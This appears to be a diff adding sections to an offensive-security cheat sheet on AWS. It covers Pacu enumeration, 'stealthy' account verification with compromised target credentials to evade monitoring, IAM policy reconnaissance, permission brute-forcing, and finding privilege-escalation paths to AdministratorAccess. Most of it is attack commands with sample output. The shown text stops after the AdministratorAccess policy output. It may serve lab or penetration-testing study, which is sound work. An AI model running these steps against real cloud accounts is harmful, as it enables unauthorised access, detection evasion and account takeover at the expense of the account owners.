@@ -530,7 +530,334 @@ content_editor" > /tmp/role-names.txt
 pacu
 import_keys attacker
 
+# enum users and roles
 run iam__enum_users --word-list /tmp/user-names.txt --account-id TARGET-ACCOUNT-ID
 run iam__enum_roles --word-list /tmp/role-names.txt --account-id TARGET-ACCOUNT-ID
 
+# assume role
+assume_role "arn:aws:iam::123456789012:role/cloudadmin
+
+# enum vpcs
+run ec2__enum --regions us-east-1
+
+# all show session
+data
+
+```
+
+## AWS CLI IAM Recon using Target Credentials
+
+Scenario
+
+* AWS enumeration (with no IoC) and Initial compromise via AssumeRole is done
+* Obtained target credentials and configure a profile for interaction
+* Start Recon via CLI using
+* Goal: Avoid detection by monitoring and alerting
+
+Attack
+
+```shell
+# stealthy mode of account verification using the target profile
+# requires non-existent lambda function
+aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile
+...
+An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::619071316869:user/support/clouddesk
+
+# non-stealthy mode of account verification using the attacker profile
+# requires access-key-id of the target
+aws --profile attacker sts get-access-key-info --access-key-id AID...
+
+{
+    "Account": "123456789012"
+}
+
+# non-stealthy mode of account verification using the target profile
+# avoid query of target caller identity, due to logging and monitoring
+aws configure --profile target
+aws --profile target sts get-caller-identity 
+
+{
+    "UserId": "AID...",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/support/clouddesk"
+}
+
+```
+
+## AWS CLI IAM Recon List Policies using Target Account
+
+Scenario
+
+* Initial compromise with target credential
+* Understand the permissions of the compromised user
+* Review user and group policies and managed policies
+* Sources:
+* e.g. [JobFunctions](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/SupportUser.html)
+* e.g. [SupportUser](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/SupportUser.html)
+
+```shell
+# list user policies
+aws --profile target iam list-user-policies --user-name clouddesk
+aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "deny_challenges_access",
+            "PolicyArn": "arn:aws:iam::123456789012:policy/deny_challenges_access"
+        }
+    ]
+}
+
+# list user groups
+aws --profile target iam list-groups-for-user --user-name clouddesk
+
+{
+    "Groups": [
+        {
+            "Path": "/support/",
+            "GroupName": "support",
+            "GroupId": "AG...",
+            "Arn": "arn:aws:iam::123456789012:group/support/support",
+            "CreateDate": "2025-11-14T08:28:52+00:00"
+        }
+    ]
+}
+
+# list user policies
+# e.g. job-function is a aws management policy
+aws --profile target iam list-group-policies --group-name support
+aws --profile target iam list-attached-group-policies --group-name support
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "SupportUser",
+            "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
+        }
+    ]
+}
+
+# list aws managed policies version and permission
+aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
+...
+    "Versions": [
+        {
+            "VersionId": "v9",
+            "IsDefaultVersion": true,
+            "CreateDate": "2025-07-10T17:07:07+00:00"
+        },
+...
+
+# BOOM!
+# support user can read, list and describe all resources
+aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v9
+
+     "Effect": "Allow",
+     "Resource": "*"
+
+```
+
+## AWS CLI IMS Recon with Pacu (noisy!!!)
+
+Scenario
+
+* If we don't find any usefull permission we can do a brute force
+* ATTENTION: it triggers monitoring alarms and does extensive logging
+
+```shell
+pacu#
+
+# use keys and assume roles
+import_key target
+swap_keys target
+assume_role role-arn
+
+run iam__enum_users_roles_policies_groups
+data IAM Users
+data IAM Roles
+data IAM Groups
+data IAM Policies
+
+run iam__bruteforce_permissions --services EC2
+data EC2
+
+# list all services
+services
+```
+
+## Other AWS Recon tools
+
+* [aws cheat sheat](https://cybr.com/courses/introduction-to-aws-enumeration/lessons/cheat-sheet-iam-enumeration-cli-commands-2/)
+* [aws enumeration](https://cybr.com/courses/introduction-to-aws-enumeration/lessons/lab-introduction-to-aws-iam-enumeration-2/)
+* [pacu](https://github.com/RhinoSecurityLabs/pacu)
+* [aws_enum](https://github.com/initstring/aws_enum)
+
+## AWS CLI Enum Ressources
+
+Scenario
+
+* Known target credentials with get and list permissions or with `iam:Get*` permission
+* Enumerate resources by using server side filters and client side JMESPath query
+* [JMESPath Example](https://jmespath.org/examples.html)
+
+```shell
+# get aws managed policy permisisons
+aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
+aws --profile target iam help | grep -E "list-|get-|generate-"
+
+# get a summary to decide on next steps
+aws --profile target iam get-account-summary | tee summary.json
+...
+  "Users",
+  "Roles",
+  "Groups",
+  "MFADevices": 0
+  "AccountMFAEnabled": 0,
+  "Providers": 1,
+
+# read all account details
+# requires: iam:Get* or GetAccountAuthorizationDetails permission
+aws --profile target iam get-account-authorization-details | tee account-details.json
+
+aws --profile target iam get-account-authorization-details --filter User | tee users.json
+aws --profile target iam get-account-authorization-details --filter Role | tee roles.json
+aws --profile target iam get-account-authorization-details --filter Group | tee groups.json
+aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy | tee policies.json
+aws --profile target iam get-account-authorization-details --filter AWSManagedPolicy | tee aws-managed-policies.json
+
+
+# query locally with jp tool for imporatant
+cat users.json | jp "UserDetailList[?contains(UserName, 'admin') && contains(Path, 'admin')]"
+cat users.json | jp "UserDetailList[?contains(UserName, 'admin')]"
+cat users.json | jp "GroupDetailList[?Path=='/admin/']"   
+cat groups.json | jp "GroupDetailList[?Path=='/admin/']"  
+
+# query aws server with JMES query for important details
+aws --profile target iam get-account-authorization-details \
+--filter User \
+--query "UserDetailList[].{Name: UserName,Path: Path,Groups: GroupList}"
+aws --profile target iam get-account-authorization-details \
+--filter Group \
+--query "GroupDetailList[].{Name: GroupName,Path: Path,GroupPolicy: GroupPolicyList,AttachedManaged: AttachedManagedPolicies}"
+aws --profile target iam get-account-authorization-details \
+--filter Role \
+--query "RoleDetailList[].{Name: RoleName,Path: Path,RolePolicy: RolePolicyList,AttachedManaged: AttachedManagedPolicies}"
+
+#  list user and devices details
+aws --profile target iam list-users | tee user.json
+aws --profile target iam list-roles | tee roles.json
+aws --profile target iam list-groups | tee groups.json
+aws --profile target iam list-mfa-devices | tee mfadevices.json
+aws --profile target iam list-saml-providers | tee samlprovider.json
+
+# list and read policies details
+aws --profile target iam list-policies --scope Local --only-attached | tee tee customer-defined-policies.json
+
+aws --profile target iam list-user-policies
+aws --profile target iam get-user-policy
+aws --profile target iam list-role-policies
+aws --profile target iam get-role-policy
+aws --profile target iam list-group-policies
+aws --profile target iam get-group-policy
+
+aws --profile target list-attached-user-policies
+aws --profile target list-attached-group-policies
+aws --profile target list-attached-role-policies
+```
+
+## AWS CLI Privilege Escalation to Admin
+
+Scenario
+
+* Known Target Credentials with insufficient permissions
+* Identity a Privilege Escalation Path to Admin
+* Requires: Policies with iam:"*", or iam:AddUserToGroup permissions to **add user to admin group**
+* Requires: Policies with iam:"*", or iam:CreateAccessKey permissions to **modify admin credentials**
+* Goal: [AdministratorAccess](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AdministratorAccess.html)
+
+```shell
+aws --profile target iam get-account-authorization-details --filter User | tee users.json 
+aws --profile target iam get-account-authorization-details --filter Group | tee groups.json 
+aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy | tee policies.json
+aws --profile target iam get-account-authorization-details --filter AWSManagedPolicy | tee aws-managed-policies.json
+
+
+# Important: Tags are used Attribute Based Access Control (ABAC)
+cat users.json | jp "UserDetailList[?contains(UserName, 'admin') && contains(GroupList, 'admin')].{Arn: Arn, Name: UserName, Groups: GroupList, Tags: Tags}"
+
+[
+  {
+    "Arn": "arn:aws:iam::123456789012:user/admin/admin",
+    "Groups": [
+      "admin"
+      ...
+    ],
+    "Name": "admin",
+    "Tags": [
+      {
+        "Key": "Project",
+        "Value": "important"
+      },
+      ...
+    ]
+  }
+]
+
+# Important: Policy name indicate permissive policies
+cat users.json | jp "UserDetailList[].{User: UserName, Policies: UserPolicyList, AttachedPolicies: AttachedManagedPolicies}"
+
+# Important: Policy name of attached policies indicate permissive policies
+cat groups.json | jp "GroupDetailList[?contains(GroupName, 'admin')].AttachedManagedPolicies"
+
+  [
+    {
+      "PolicyArn": "arn:aws:iam::123456789012:policy/some/some",
+      "PolicyName": "some_admin"
+    },
+    {
+      "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
+      "PolicyName": "AdministratorAccess"
+    },
+  ]
+
+# Boom!
+# Important: Search for admin policies and policies with wildcards like "iam:*"
+cat policies.json | jp "Policies[?contains(@.PolicyName,'admin')].PolicyName"
+cat policies.json | jp "Policies[?PolicyName=='some_admin'].PolicyVersionList[].Document.Statement[?contains(@.Action, '*') || @.Action == '*']"
+
+    [
+        {
+            "Action": "iam:*",
+            "Effect": "Allow",
+            "Resource": [
+                "arn:aws:iam::123456789012:user/some/*",
+                "arn:aws:iam::123456789012:group/some/*",
+                "arn:aws:iam::123456789012:role/some/*",
+                "arn:aws:iam::123456789012:policy/some/*"
+            ],
+            "Sid": "AllowAllIAMActionsInUserPath"
+        },
+        {
+            "Action": "iam:*",
+            "Condition": {
+                "StringEquals": {
+                    "aws:ResourceTag/Project": "some"
+                }
+            },
+            "Effect": "Allow",
+            "Resource": "arn:aws:iam::*:user/*",
+            "Sid": "AllowAllIAMActionsInGroupMembers"
+        }
+    ]
+
+
+# Boom!
+# Inportant: AdministratorAccess has full access
+cat aws-managed-policies.json | jp "Policies[?PolicyName=='AdministratorAccess']" 
+...    
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": "*",
+            "Resource": "*"
+        }
 ```
